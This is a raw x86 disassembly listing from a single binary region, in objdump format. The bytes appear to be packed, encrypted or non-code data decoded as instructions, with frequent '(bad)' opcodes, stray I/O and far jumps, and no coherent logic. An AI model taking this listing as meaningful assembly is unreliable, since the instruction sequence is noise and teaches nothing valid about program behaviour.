  417e17:	aam    0xf7
  417e19:	dec    edx
  417e1a:	je     0x417e41
  417e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e1d:	mov    dh,0xb1
  417e1f:	aad    0xcb
  417e21:	cmp    eax,0xf0d69686
  417e26:	push   0xc03f88b7
  417e2b:	mov    ah,0x5e
  417e2d:	(bad)  
  417e2e:	mov    edx,0x3005c352
  417e33:	push   ecx
  417e34:	sub    BYTE PTR ds:0x6515e80c,dl
  417e3a:	push   ds
  417e3b:	imul   edi,DWORD PTR [esi],0x29
  417e3e:	push   edi
  417e3f:	pop    ebp
  417e40:	dec    esp
  417e41:	jb     0x417e89
  417e43:	aam    0x79
  417e45:	add    esi,DWORD PTR [ebp-0x5b6c9bb2]
  417e4b:	mov    ebx,0x98db79a7
  417e50:	mov    DWORD PTR [edi+0x76],esi
  417e53:	idiv   DWORD PTR [edx]
  417e55:	jae    0x417e73
  417e57:	aam    0x71
  417e59:	mov    bl,0xe
  417e5b:	into   
  417e5c:	ins    BYTE PTR es:[edi],dx
  417e5d:	cmp    DWORD PTR [eax-0x16],ebp
  417e60:	mov    bl,0xeb
  417e62:	sahf   
  417e63:	mov    edx,0x3ebf5408
  417e68:	inc    BYTE PTR [ecx-0x4d]
  417e6b:	aad    0x4c
  417e6d:	bound  ebp,QWORD PTR [esp+ecx*2]
  417e70:	aas    
  417e71:	adc    eax,0x1189698d
  417e76:	sub    cl,BYTE PTR [ebx]
  417e78:	xor    ch,BYTE PTR [ebp+edi*1-0x6c]
  417e7c:	int3   
  417e7d:	add    ch,BYTE PTR [esp+eax*8-0x32766fda]
  417e84:	cmp    eax,0xa896de2
  417e89:	int3   
  417e8a:	test   eax,0xc842e82e
  417e8f:	sbb    eax,0x8af675eb
  417e94:	mov    BYTE PTR [ebx],cl
  417e96:	sbb    eax,0xb6ef6c8f
  417e9b:	js     0x417f16
  417e9d:	xor    BYTE PTR [ecx-0x4b],ah
  417ea0:	mov    esp,0xc0b82c6e
  417ea5:	xchg   edi,eax
  417ea6:	aas    
  417ea7:	jb     0x417eab
  417ea9:	jo     0x417f0f
  417eab:	popf   
  417eac:	mov    BYTE PTR [ebx],bl
  417eae:	xor    eax,0xb4cce5de
  417eb3:	cdq    
  417eb4:	mov    BYTE PTR [ebp+0x22],al
  417eb7:	jmp    DWORD PTR [edx]
  417eb9:	or     al,0x7b
  417ebb:	sub    al,0xaa
  417ebd:	add    eax,0xeca204bc
  417ec2:	xchg   ebx,eax
  417ec3:	add    ah,dh
  417ec5:	shl    DWORD PTR [edx-0xd],cl
  417ec8:	adc    DWORD PTR [ecx-0x6cf9f960],0xeac672c8
  417ed2:	imul   BYTE PTR [edx+0x59ab4533]
  417ed8:	jle    0x417e5c
  417eda:	pop    edx
  417edb:	call   0xe188:0x1b2b2955
  417ee2:	or     ebp,DWORD PTR ss:[ecx+0x4a]
  417ee6:	push   ecx
  417ee7:	jnp    0x417e89
  417ee9:	add    bh,BYTE PTR [eax-0xfd14711]
  417eef:	push   0xffffffcc
  417ef1:	(bad)  
  417ef2:	pusha  
  417ef3:	xor    esi,DWORD PTR [esp+esi*1]
  417ef6:	aam    0xf8
  417ef8:	out    0xfd,al
  417efa:	or     dl,bh
  417efc:	fs fcomip st,st(6)
  417eff:	mov    esi,0x8dd9ed23
  417f04:	mov    edi,edi
  417f06:	xchg   edx,eax
  417f07:	adc    dl,al
  417f09:	adc    esi,DWORD PTR [edi]
  417f0b:	jmp    0xf4ab49e2
  417f10:	and    BYTE PTR ds:0x82f19039,0x40
  417f17:	fs ins DWORD PTR es:[edi],dx
  417f19:	push   ebp
  417f1a:	pop    ds
  417f1b:	or     DWORD PTR [ebx+0x7b],ebp
  417f1e:	fs xchg edx,eax
  417f20:	add    dh,BYTE PTR [ecx+0x33]
  417f23:	xlat   BYTE PTR ds:[ebx]
  417f24:	mov    ebp,0x46132ce
  417f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f2a:	aad    0x12
  417f2c:	mov    edi,ecx
  417f2e:	jns    0x417ed6
  417f30:	xchg   esi,eax
  417f31:	pop    ss
  417f32:	dec    ebp
  417f33:	xchg   ebp,eax
  417f34:	mov    al,0x46
  417f36:	outs   dx,BYTE PTR ds:[esi]
  417f37:	push   0xffffffbe
  417f39:	sbb    al,0x66
  417f3b:	inc    eax
  417f3c:	inc    eax
  417f3d:	mov    ds:0x2ace9d0f,al
  417f42:	ins    DWORD PTR es:[edi],dx
  417f43:	pop    es
  417f44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f45:	adc    BYTE PTR [edi-0x100837af],ah
  417f4b:	lock push 0xc4af8652
  417f51:	add    cl,BYTE PTR [esi+0x59]
  417f54:	ret    0xec65
  417f57:	and    BYTE PTR [esi-0x7e],al
  417f5a:	pop    ds
  417f5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f5c:	add    DWORD PTR [edx-0x6f79ba44],esp
  417f62:	adc    dl,dl
  417f64:	cmp    dl,bh
  417f66:	mov    ebp,0x7ffc2153
  417f6b:	rcr    bh,1
  417f6d:	mov    DWORD PTR [edi],ebx
  417f6f:	add    DWORD PTR [ebx-0x2],eax
  417f72:	or     al,0xbf
  417f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f75:	bound  eax,QWORD PTR [edx-0x6bf7092c]
  417f7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f7c:	popa   
  417f7d:	push   esp
  417f7e:	pop    edi
  417f7f:	iret   
  417f80:	mov    BYTE PTR [ebx-0x72],bl
  417f83:	inc    edi
  417f84:	sbb    cl,0xc3
  417f87:	jmp    0x56e0:0x461617e7
  417f8e:	xchg   DWORD PTR [edi-0x68],edx
  417f91:	fsubr  st(7),st
  417f93:	in     eax,dx
  417f94:	call   0x317:0xee751e39
  417f9b:	xor    DWORD PTR [edx],ecx
  417f9d:	rcl    esp,cl
  417f9f:	aad    0x84
  417fa1:	scas   al,BYTE PTR es:[edi]
  417fa2:	aam    0x2e
  417fa4:	lock icebp 
  417fa6:	jae    0x417f7f
  417fa8:	mov    esi,DWORD PTR [edi+0x4b]
  417fab:	sbb    al,0x6
  417fad:	inc    ebp
  417fae:	cmp    eax,0x5c2348d3
  417fb3:	aad    0x22
  417fb5:	icebp  
  417fb6:	imul   ebp,DWORD PTR [edx-0x4b51dc0b],0xffffff8f
  417fbd:	jnp    0x418015
  417fbf:	repnz pop esi
  417fc1:	test   eax,0x2412f42e
  417fc6:	inc    ebp
  417fc7:	mov    eax,0xc9077073
  417fcc:	mov    esp,ebx
  417fce:	add    edi,edx
  417fd0:	pop    ecx
  417fd1:	je     0x417fd1
  417fd3:	push   ebp
  417fd4:	push   ds
  417fd5:	sbb    DWORD PTR [edi],0xa4d73521
  417fdb:	mov    ecx,0x5f438b55
  417fe0:	cmp    esp,ecx
  417fe2:	pusha  
  417fe3:	xchg   ecx,eax
  417fe4:	out    dx,al
  417fe5:	xchg   esi,eax
  417fe6:	dec    esp
  417fe7:	(bad)  
  417fe8:	dec    esi
  417fe9:	lods   al,BYTE PTR ds:[esi]
  417fea:	outs   dx,BYTE PTR ds:[esi]
  417feb:	fwait
  417fec:	adc    BYTE PTR [ecx-0x26d72d44],bl
  417ff2:	lahf   
  417ff3:	popa   
  417ff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ff5:	pop    ss
  417ff6:	mov    esp,0xa7212137
  417ffb:	jbe    0x417fc5
  417ffd:	inc    esi
  417ffe:	imul   esp,DWORD PTR ds:0xe160ec23,0x6f42985b
  418008:	pop    esp
  418009:	pop    ss
  41800a:	dec    edi
  41800b:	mov    ecx,0x9c5e8555
  418010:	or     DWORD PTR [edi-0x2779dbf9],ebx
  418016:	ror    ch,0xfa
  418019:	mov    esp,0xd6d8b91f
  41801e:	mov    cs,WORD PTR [edx-0x2831802c]
  418024:	pop    esp
  418025:	das    
  418026:	xor    eax,0x54f3e4c2
  41802b:	int3   
  41802c:	dec    ebx
  41802d:	lea    ecx,[ebx+edx*8-0x13]
  418031:	inc    edi
  418032:	arpl   WORD PTR gs:[esi],di
  418035:	push   0xffffffef
  418037:	in     eax,0x57
  418039:	pop    ecx
  41803a:	out    0x44,al
  41803c:	mov    cl,0xd3
  41803e:	pusha  
  41803f:	fld    DWORD PTR es:[edi-0x74]
  418043:	push   ebx
  418044:	sbb    al,0xb8
  418046:	arpl   WORD PTR [ecx-0x7e],bp
  418049:	out    0x79,al
  41804b:	pop    ecx
  41804c:	rol    BYTE PTR [edx],1
  41804e:	lea    edi,[esi-0x5a]
  418051:	pop    ds
  418052:	dec    ecx
  418053:	rcl    BYTE PTR [esi-0x28],1
  418056:	test   al,0x31
  418058:	pop    edi
  418059:	mov    cl,0x20
  41805b:	js     0x41802a
  41805d:	lock pop ds
  41805f:	icebp  
  418060:	iret   
  418061:	push   edx
  418062:	fmul   QWORD PTR [edi]
  418064:	xchg   BYTE PTR [esi],cl
  418066:	mov    edx,esp
  418068:	mov    edi,0xef8cc284
  41806d:	(bad)  [esi+esi*2-0x2f7fe478]
  418074:	inc    eax
  418075:	pop    esi
  418076:	ds gs ds add edi,esi
  41807b:	mov    ebx,0x6847c267
  418080:	cwde   
  418081:	mov    al,0x1f
  418083:	adc    ecx,DWORD PTR [esi]
  418085:	and    DWORD PTR [edi],esi
  418087:	jl     0x41803b
  418089:	inc    ebx
  41808a:	icebp  
  41808b:	aad    0x95
  41808d:	pop    ebx
  41808e:	push   ebp
  41808f:	cdq    
  418090:	mov    al,0xed
  418092:	cld    
  418093:	push   cs
  418094:	xchg   BYTE PTR [ebx],dh
  418096:	scas   al,BYTE PTR es:[edi]
  418097:	jp     0x41806b
  418099:	ret    0x1aed
  41809c:	test   al,0xd4
  41809e:	sbb    BYTE PTR [ecx-0x4e],bl
  4180a1:	in     eax,0x34
  4180a3:	aam    0x77
  4180a5:	mov    esp,DWORD PTR [eax-0x50]
  4180a8:	mov    bl,0xb6
  4180aa:	outs   dx,DWORD PTR ds:[esi]
  4180ab:	ja     0x418113
  4180ad:	je     0x4180ce
  4180af:	imul   esi,DWORD PTR [esi+0x52],0xdec017e1
  4180b6:	xor    edi,edx
  4180b8:	(bad)  
  4180b9:	sbb    dh,BYTE PTR [ecx+0x9123325]
  4180bf:	xor    ebx,DWORD PTR [eax]
  4180c1:	sar    BYTE PTR [ebx],cl
  4180c3:	xlat   BYTE PTR ds:[ebx]
  4180c4:	pop    edi
  4180c5:	inc    eax
  4180c6:	loopne 0x418143
  4180c8:	jno    0x41812b
  4180ca:	jg     0x418098
  4180cc:	mov    ebx,0x15860a03
  4180d1:	pop    esi
  4180d2:	stos   BYTE PTR es:[edi],al
  4180d3:	data16 sbb ch,BYTE PTR [ebx+0x13f54d70]
  4180da:	xchg   esp,eax
  4180db:	pop    eax
  4180dc:	sbb    ebx,DWORD PTR [esi]
  4180de:	add    al,0x3c
  4180e0:	dec    edi
  4180e1:	pop    ss
  4180e2:	cmp    eax,0xf0871f57
  4180e7:	(bad)
  4180ea:	or     BYTE PTR [edi],dl
  4180ec:	mov    BYTE PTR [edx+ecx*8],dh
  4180ef:	and    DWORD PTR [eax+0x5f6f1f78],edi
  4180f5:	lahf   
  4180f6:	je     0x418176
  4180f8:	adc    bl,BYTE PTR [edi+0x10]
  4180fb:	xlat   BYTE PTR ds:[ebx]
  4180fc:	sub    cl,BYTE PTR [ebx-0x7128774b]
  418102:	mov    edi,0x1e396ccd
  418107:	dec    edi
  418108:	inc    esi
  418109:	call   0xd3afe6e2
  41810e:	(bad)  
  418110:	loope  0x4180c1
  418112:	push   es
  418113:	xchg   edx,eax
  418114:	mov    al,ds:0x73660730
  418119:	ret    0xfd60
  41811c:	call   0x861f:0xd4d6d723
  418123:	aam    0xbe
  418125:	push   ss
  418126:	fidiv  WORD PTR [ebp+0x59]
  418129:	xchg   DWORD PTR [edx-0x1b],ebx
  41812c:	call   0x8a74a61a
  418131:	fdivr  DWORD PTR [eax-0x2e]
  418134:	dec    ebx
  418135:	push   ebx
  418136:	dec    ebp
  418137:	sbb    BYTE PTR [edx+edi*8-0x40097f30],bl
  41813e:	pusha  
  41813f:	inc    ebx
  418140:	cmp    BYTE PTR ds:0x9c32f849,0xa
  418147:	aam    0xca
  418149:	in     al,dx
  41814a:	shld   DWORD PTR [ebx-0xb],esp,0xd7
  41814f:	xchg   BYTE PTR ds:0x5a75cbf7,dh
  418156:	push   ds
  418157:	inc    ecx
  418158:	inc    edx
  418159:	cdq    
  41815a:	dec    ebx
  41815b:	mov    al,0x72
  41815d:	xchg   DWORD PTR [edi+0x3a58ddd4],ebp
  418163:	mov    ch,0xaa
  418165:	push   esi
  418166:	pop    ds
  418167:	adc    esp,DWORD PTR [ebx]
  418169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41816a:	xchg   esi,eax
  41816b:	arpl   WORD PTR [ebx+edi*4],bp
  41816e:	(bad)  
  418170:	jmp    0x392a:0x383cfcdb
  418177:	jno    0x418102
  418179:	push   ebp
  41817a:	mov    ecx,eax
  41817c:	pop    edi
  41817d:	sbb    edx,0x13
  418180:	push   eax
  418181:	add    edx,DWORD PTR [esi+0x2b5ee01c]
  418187:	ss mov edx,0xd73706fd
  41818d:	mov    ebx,DWORD PTR [esi+0x7f]
  418190:	push   eax
  418191:	and    al,0xb2
  418194:	fdivr  DWORD PTR [edi+edx*1-0x77fa7cb6]
  41819b:	leave  
  41819c:	sbb    eax,0x6a23e03f
  4181a1:	scas   eax,DWORD PTR es:[edi]
  4181a2:	pop    ds
  4181a3:	sbb    DWORD PTR [edx+esi*1+0x5e4fd4],ebp
  4181aa:	and    al,0xad
  4181ac:	inc    edx
  4181ad:	mov    ds:0x138ca293,eax
  4181b2:	mov    esi,0x694dd5d2
  4181b7:	iret   
  4181b8:	pop    esi
  4181b9:	addr16 pop ecx
  4181bb:	mov    ebp,0xb6b4fc89
  4181c0:	push   esp
  4181c1:	add    bl,dl
  4181c3:	fild   WORD PTR [ebx]
  4181c5:	mov    eax,0x63bb495b
  4181ca:	push   ds
  4181cb:	outs   dx,DWORD PTR ds:[esi]
  4181cc:	jns    0x41823e
  4181ce:	mov    ebx,0x8ca30e92
  4181d3:	aam    0xa5
  4181d5:	jnp    0x418256
  4181d7:	mov    ds:0x7141f78c,al
  4181dc:	mov    DWORD PTR ds:0xb93f633e,esp
  4181e2:	mov    es,WORD PTR [edx-0x3a]
  4181e5:	add    eax,0x6fe19a6a
  4181ea:	fcmove st,st(2)
  4181ec:	pushf  
  4181ed:	retf   0x3360
  4181f0:	xchg   edi,eax
  4181f1:	xor    esp,DWORD PTR ds:0x54a4a818
  4181f7:	mov    ebp,0xbd197b41
  4181fc:	ins    DWORD PTR es:[edi],dx
  4181fd:	push   ebp
  4181fe:	pop    ds
  4181ff:	stos   DWORD PTR es:[edi],eax
  418200:	mov    bl,0x1d
  418202:	cmp    al,0x5e
  418204:	or     BYTE PTR [edx+0x34],ah
  418207:	xlat   BYTE PTR ds:[ebx]
  418208:	in     al,0x42
  41820a:	inc    ebx
  41820b:	xchg   ebx,eax
  41820c:	out    0x6d,al
  41820e:	dec    edx
  41820f:	ror    DWORD PTR [esi-0x1c0c0af],cl
  418215:	and    edx,DWORD PTR fs:[esi]
  418218:	enter  0xd731,0x56
  41821c:	popa   
  41821d:	add    dl,BYTE PTR [edx]
  41821f:	pop    eax
  418220:	js     0x41822e
  418222:	dec    esp
  418223:	or     al,0x8f
  418225:	neg    DWORD PTR [edi]
  418227:	inc    ecx
  418228:	and    DWORD PTR [edx],ebx
  41822a:	test   al,0xda
  41822c:	xor    al,0x3c
  41822e:	rcl    esp,cl
  418230:	cdq    
  418231:	nop
  418232:	ins    BYTE PTR es:[edi],dx
  418233:	push   esi
  418234:	sub    BYTE PTR [esi],0x8b
  418237:	leave  
  418238:	popa   
  418239:	dec    ebx
  41823a:	push   ds
  41823b:	das    
  41823c:	out    dx,eax
  41823d:	add    al,0xaa
  41823f:	add    DWORD PTR [ebp+ebx*8-0x38],0xffffffd5
  418244:	cmp    al,0x6f
  418246:	mov    edi,0x14398cf1
  41824b:	xor    DWORD PTR [ecx+0x332e24ab],ecx
  418251:	fnop   
  418253:	test   al,0xa0
  418255:	add    edx,esp
  418257:	fdiv   st,st(0)
  418259:	sub    BYTE PTR [ecx],bh
  41825b:	inc    esp
  41825c:	dec    ecx
  41825d:	(bad)  
  41825f:	xchg   ecx,eax
  418260:	xchg   edi,eax
  418261:	test   DWORD PTR [esi-0x23],0x7ba24320
  418268:	enter  0x75ca,0x9f
  41826c:	(bad)  
  41826d:	enter  0xaa03,0x52
  418271:	test   al,0x30
  418273:	ja     0x41825a
  418275:	scas   al,BYTE PTR es:[edi]
  418276:	xchg   esi,eax
  418277:	cli    
  418278:	fs inc ebp
  41827a:	pop    ds
  41827b:	(bad)  
  41827c:	rcl    DWORD PTR [edi-0x3b],cl
  41827f:	add    DWORD PTR [edx],ebp
  418281:	mov    BYTE PTR [ebx-0x2b],bh
  418284:	ds sbb eax,0x7965622c
  41828a:	(bad)  
  41828c:	mov    DWORD PTR [ebp+0x1b],edx
  41828f:	ret    
  418290:	out    dx,al
  418291:	adc    BYTE PTR [ebx],bh
  418293:	es jg  0x418299
  418296:	lods   al,BYTE PTR ds:[esi]
  418297:	lahf   
  418298:	loopne 0x41821c
  41829a:	ret    0x118a
  41829d:	mov    BYTE PTR [edi],bl
  41829f:	jmp    0x41823f
  4182a1:	test   eax,0x40bce655
  4182a6:	(bad)  
  4182a8:	stc    
  4182a9:	mov    ebp,DWORD PTR [esi]
  4182ab:	aad    0xb3
  4182ad:	sbb    ah,dh
  4182af:	jno    0x41823a
  4182b1:	inc    ecx
  4182b2:	jnp    0x418247
  4182b4:	je     0x418327
  4182b6:	add    BYTE PTR [esi+0x49c98afb],dh
  4182bc:	mov    DWORD PTR [esi-0x195e1eb3],ebp
  4182c2:	mov    dl,0xa1
  4182c4:	mov    BYTE PTR [ebx-0xc],bh
  4182c7:	test   DWORD PTR [eax],edi
  4182c9:	(bad)  
  4182ca:	push   edx
  4182cb:	fwait
  4182cc:	add    BYTE PTR gs:[eax],bl
  4182cf:	inc    ebp
  4182d0:	and    eax,0xdc6d4542
  4182d5:	cmp    BYTE PTR [ecx+0x60cd2594],0x7b
  4182dc:	add    eax,0xb2ebd1c5
  4182e1:	mov    edi,0x9d1d499
  4182e6:	sti    
  4182e7:	mov    WORD PTR [eax],es
  4182e9:	lea    edi,[edx+eax*4]
  4182ec:	mov    DWORD PTR [ebp-0x29],ebx
  4182ef:	mov    ds:0xe60fd883,eax
  4182f4:	dec    eax
  4182f5:	loope  0x418304
  4182f7:	xlat   BYTE PTR ds:[ebx]
  4182f8:	cmp    BYTE PTR ds:0xf0d9ee6a,dh
  4182fe:	out    0x23,al
  418300:	mov    BYTE PTR [ebp+0x3d],bl
  418303:	sbb    al,0xd5
  418305:	sar    ch,0x14
  418308:	and    eax,DWORD PTR [ebx]
  41830a:	ss jnp 0x41834c
  41830d:	mov    ds,WORD PTR [edx]
  41830f:	repnz mov ebp,0x618d60f7
  418315:	shr    ah,cl
  418317:	push   ebp
  418318:	int3   
  418319:	jnp    0x4182e4
  41831b:	mov    edx,0x4cf2f667
  418320:	or     BYTE PTR [eax-0x44],dh
  418323:	add    DWORD PTR [ebp-0x509ae07f],esi
  418329:	outs   dx,BYTE PTR ds:[esi]
  41832a:	add    al,0x5a
  41832c:	sub    al,0x2a
  41832e:	xchg   ebp,eax
  41832f:	rcr    DWORD PTR [eax+ebp*8-0x163e5af3],cl
  418336:	pusha  
  418337:	enter  0x9103,0x64
  41833b:	push   ebp
  41833c:	stos   BYTE PTR es:[edi],al
  41833d:	pop    ecx
  41833e:	sub    al,0x1d
  418340:	(bad)  
  418341:	add    cl,bl
  418343:	dec    esi
  418344:	and    al,0x9b
  418346:	and    ch,0xbc
  418349:	add    ah,BYTE PTR [esp+eiz*4-0x75bf13]
  418350:	leave  
  418351:	inc    edx
  418352:	push   ds
  418353:	sub    DWORD PTR [esi],ecx
  418355:	arpl   bx,ax
  418357:	arpl   WORD PTR [esi],cx
  418359:	ds jle 0x418330
  41835c:	ret    0x7c09
  41835f:	mov    edi,0x227097f8
  418364:	scas   eax,DWORD PTR es:[edi]
  418365:	add    eax,0xd8ee201
  41836a:	mov    esi,0x11622637
  41836f:	in     al,dx
  418370:	mov    bl,0xca
  418372:	pop    ss
  418373:	xor    DWORD PTR [esi+edi*8-0x6d],0xffffffd5
  418378:	fstp   DWORD PTR [ecx]
  41837a:	pop    esi
  41837b:	adc    al,0x11
  41837d:	pusha  
  41837e:	hlt    
  41837f:	push   cs
  418380:	xor    DWORD PTR [ebp+0x5a],0x5
  418384:	outs   dx,DWORD PTR ds:[esi]
  418385:	mov    dl,0x60
  418387:	mov    ?,WORD PTR [eax+0x5c]
  41838a:	fcmovnbe st,st(4)
  41838c:	iret   
  41838d:	cmp    eax,0xb7e631b4
  418392:	gs mov ch,0x88
  418395:	sbb    DWORD PTR [eax],edx
  418397:	mov    edi,0x3dc020c3
  41839c:	jge    0x4183b3
  41839e:	dec    esp
  41839f:	mov    ds:0xd4a499b4,eax
  4183a4:	(bad)  
  4183a5:	fbld   TBYTE PTR [edx+0x2e]
  4183a8:	mov    BYTE PTR [ecx-0x34c7aacf],al
  4183ae:	dec    eax
  4183af:	dec    eax
  4183b0:	lds    eax,FWORD PTR ds:0x7c539c0a
  4183b6:	frstor [ebx]
  4183b8:	adc    eax,0xe371e53
  4183bd:	and    al,BYTE PTR [edx]
  4183bf:	popa   
  4183c0:	test   BYTE PTR [edx+0x51],ch
  4183c3:	lahf   
  4183c4:	add    dh,BYTE PTR [ebp-0xa]
  4183c7:	push   ebx
  4183c8:	cmp    bl,ah
  4183ca:	and    eax,0xa65ca94b
  4183cf:	mov    al,ds:0x4ee6f789
  4183d4:	cld    
  4183d5:	pop    es
  4183d6:	sbb    DWORD PTR [edi-0x3a],ebx
  4183d9:	(bad)  
  4183da:	(bad)
  4183dd:	retf   0x48de
  4183e0:	out    0x90,al
  4183e2:	add    al,0x37
  4183e4:	test   al,0x62
  4183e6:	(bad)  
  4183e7:	fnstenv [esi-0x23]
  4183ea:	push   esp
  4183eb:	pop    esp
  4183ec:	test   BYTE PTR [edx+0x3bea65c],0xc8
  4183f3:	xchg   edx,eax
  4183f4:	xor    eax,0x3bff0927
  4183f9:	ret    0xd7b3
  4183fc:	mov    BYTE PTR [edi],dh
  4183fe:	in     eax,0xfd
  418400:	xchg   ebx,eax
  418401:	mov    ds:0x1b0987db,eax
  418406:	and    dh,al
  418408:	and    edx,DWORD PTR [ecx-0x55]
  41840b:	shr    BYTE PTR [ebx+ebx*8],cl
  41840e:	pusha  
  41840f:	ss cwde 
  418411:	jae    0x418431
  418413:	pop    ss
  418414:	xor    eax,0x20164db3
  418419:	lahf   
  41841a:	(bad)
  41841d:	inc    esi
  41841e:	push   es
  41841f:	test   eax,0x68c2031c
  418424:	nop
  418425:	push   esp
  418426:	sbb    dh,0x88
  418429:	xchg   ecx,ebx
  41842b:	rcl    DWORD PTR ds:0x44624e77,1
  418431:	add    eax,DWORD PTR [esi]
  418433:	inc    esp
  418434:	or     BYTE PTR [edx],cl
  418436:	aad    0x79
  418438:	pop    ebx
  418439:	aad    0x1f
  41843b:	cmc    
  41843c:	xchg   esp,eax
  41843d:	pop    esi
  41843e:	jmp    0x4642:0xb547fbf3
  418445:	aas    
  418446:	je     0x41847b
  418448:	fs leave 
  41844a:	pusha  
  41844b:	xchg   edi,eax
  41844c:	mov    eax,0x89916d94
  418451:	popa   
  418452:	mov    esi,0x6eb631c3
  418457:	jp     0x418492
  418459:	adc    eax,0xb7fc83b2
  41845e:	xchg   ebp,edx
  418460:	jbe    0x418422
  418462:	(bad)  
  418463:	mov    ch,0x88
  418465:	xchg   ebp,eax
  418466:	pop    ebp
  418467:	mov    bl,0x8f
  418469:	in     eax,dx
  41846a:	jne    0x4183f3
  41846c:	inc    edi
  41846d:	add    edx,DWORD PTR [esi+0x3b]
  418470:	sub    ecx,DWORD PTR [edx-0x2b]
  418473:	inc    edi
  418474:	ins    DWORD PTR es:[edi],dx
  418475:	mov    cl,BYTE PTR [edi-0x3cbbb8bd]
  41847b:	mov    BYTE PTR [edi-0x74ebaf4b],dl
  418481:	out    dx,al
  418482:	sub    DWORD PTR ds:0x19680234,0xffffff9f
  418489:	xor    DWORD PTR [edi],ecx
  41848b:	(bad)  
  41848d:	sbb    al,0x1e
  41848f:	in     eax,dx
  418490:	xchg   BYTE PTR [ecx+edi*1+0x3883f012],dl
  418497:	aam    0x9a
  418499:	nop
  41849a:	std    
  41849b:	dec    ecx
  41849c:	scas   eax,DWORD PTR es:[edi]
  41849d:	mov    dl,0xb3
  41849f:	push   esp
  4184a0:	xchg   ebp,edx
  4184a2:	push   esp
  4184a3:	inc    esi
  4184a4:	bound  ebx,QWORD PTR [edx-0x74]
  4184a7:	arpl   WORD PTR [eax-0x680b6413],bp
  4184ad:	jno    0x418507
  4184af:	ds pushf 
  4184b1:	push   esi
  4184b2:	and    BYTE PTR [ecx+edx*4-0x2c91bffe],cl
  4184b9:	(bad)  
  4184ba:	lods   eax,DWORD PTR ds:[esi]
  4184bb:	sar    BYTE PTR [edx+ecx*1+0x60],0x5f
  4184c0:	xchg   ebx,eax
  4184c1:	push   eax
  4184c2:	add    bh,BYTE PTR [ebp-0x5e]
  4184c5:	jmp    0x1564:0xbc21d4a8
  4184cc:	sahf   
  4184cd:	mov    esi,0xb38a470c
  4184d2:	retf   0xdf80
  4184d5:	js     0x418525
  4184d7:	mov    esi,0xd552a068
  4184dc:	xlat   BYTE PTR ds:[ebx]
  4184dd:	sbb    BYTE PTR [ecx-0x10],0x43
  4184e1:	mov    ds:0xf5884962,eax
  4184e6:	ffree  st(4)
  4184e8:	inc    edx
  4184e9:	rcr    BYTE PTR [ebx],1
  4184eb:	mov    eax,0xc7ce014a
  4184f0:	mov    eax,0x58f952e8
  4184f5:	inc    ebx
  4184f6:	pushf  
  4184f7:	out    dx,al
  4184f8:	mov    ch,cl
  4184fa:	adc    ebx,DWORD PTR [edx-0x2d89fa9f]
  418500:	dec    ebp
  418501:	dec    eax
  418502:	call   DWORD PTR ds:0xd2b5f58e
  418508:	jg     0x4184dd
  41850a:	(bad)  
  41850b:	mov    ch,BYTE PTR [eax]
  41850d:	sub    BYTE PTR [ebp+ebp*4-0x6f13fdef],bl
  418514:	pusha  
  418515:	push   ds
  418516:	inc    ebp
  418517:	cmc    
  418518:	loop   0x4184b4
  41851a:	xor    al,0x83
  41851c:	mov    ah,bl
  41851e:	ss xor eax,0xcfee4ceb
  418524:	call   0xa316e41e
  418529:	jl     0x41851f
  41852b:	xlat   BYTE PTR ds:[ebx]
  41852c:	cmp    DWORD PTR [esi],ebx
  41852e:	dec    ebp
  41852f:	popf   
  418530:	mov    BYTE PTR [ebx+0x15940582],ah
  418536:	ret    
  418537:	test   eax,0xf76395a4
  41853c:	xchg   esi,eax
  41853d:	fisttp QWORD PTR [edx]
  41853f:	scas   al,BYTE PTR es:[edi]
  418540:	leave  
  418541:	mov    ah,0xc9
  418543:	cmp    BYTE PTR [ecx-0x77a520a6],al
  418549:	cmc    
  41854a:	arpl   WORD PTR [edx-0x75],bx
  41854d:	shl    cl,cl
  41854f:	test   eax,0x32840257
  418554:	sub    BYTE PTR [ecx],bh
  418556:	push   edi
  418557:	sub    ebx,esp
  418559:	aam    0x60
  41855b:	sbb    esi,DWORD PTR [edi+0x28]
  41855e:	or     BYTE PTR [esi-0x2bf1973c],ch
  418564:	fsub   QWORD PTR [esi+0x2c00d9b4]
  41856a:	xor    BYTE PTR [ebx-0x76],0xd5
  41856e:	into   
  41856f:	ja     0x41853b
  418571:	fadd   QWORD PTR ds:0xae06bd5
  418577:	imul   ecx
  418579:	das    
  41857a:	jmp    0x418573
  41857c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41857d:	stc    
  41857e:	jne    0x418555
  418580:	sub    BYTE PTR es:[ebp-0x53],cl
  418584:	cmp    ecx,ebp
  418586:	js     0x418582
  418588:	mov    ch,0x9b
  41858a:	pusha  
  41858b:	mov    al,ds:0x116e3588
  418590:	into   
  418591:	pusha  
  418592:	jmp    0x418577
  418594:	xor    bl,BYTE PTR [ebx-0x3421a8fd]
  41859a:	out    dx,eax
  41859b:	mov    ebx,0x4b8df0f2
  4185a0:	mov    BYTE PTR [ebp*8+0x1fb62363],dh
  4185a7:	in     eax,0xcc
  4185a9:	pop    ss
  4185aa:	leave  
  4185ab:	retf   0x2dc2
  4185ae:	add    edi,edx
  4185b0:	inc    edx
  4185b1:	jl     0x4185ca
  4185b3:	or     esi,DWORD PTR [edx+0x72]
  4185b6:	push   0xcd0f8875
  4185bb:	data16 fstp TBYTE PTR [ebp+0x60]
  4185bf:	ja     0x418600
  4185c1:	sbb    al,0xbe
  4185c3:	daa    
  4185c4:	rcr    BYTE PTR [ecx+edx*2-0x50],0x89
  4185c9:	adc    eax,0xa1655860
  4185ce:	hlt    
  4185cf:	call   FWORD PTR [edi]
  4185d1:	add    BYTE PTR [eax],ah
  4185d3:	imul   esp,DWORD PTR [edi-0x4c],0xffffffdb
  4185d7:	stc    
  4185d8:	ret    0x9ca2
  4185db:	ror    BYTE PTR [eax+0x6c4a6523],1
  4185e1:	ins    BYTE PTR es:[edi],dx
  4185e2:	rcl    BYTE PTR ds:0xb2480342,cl
  4185e8:	ja     0x4185a9
  4185ea:	out    0xb2,eax
  4185ec:	sub    DWORD PTR [edx+0x1f],0x77647c2d
  4185f3:	or     eax,DWORD PTR [edx+0x30d40275]
